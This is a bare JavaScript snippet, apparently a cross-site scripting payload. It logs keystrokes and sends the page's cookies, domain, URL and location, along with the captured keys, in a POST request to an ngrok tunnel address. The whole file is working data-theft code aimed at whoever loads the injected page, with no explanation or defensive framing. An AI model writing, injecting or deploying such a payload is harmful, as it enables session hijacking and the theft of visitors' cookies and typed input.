var url = 'http://5e6cc2a04902.ngrok.io';

var keys = ''

document.onkeydown = (e) => keys = keys + e.code;

fetch(url, {
	method: 'POST',
	credentials: 'include',
	body: JSON.stringify({
		domain: document.domain,
		cookie: document.cookie,
		root_page: document.location.href,
		doctype: document.doctype,
		visitState: document.visibilityState,
		dir: document.dir,
		url_: document.url,
		location_: document.location,	
		key: keys,		
		plugins: document.plugins,
	})
})

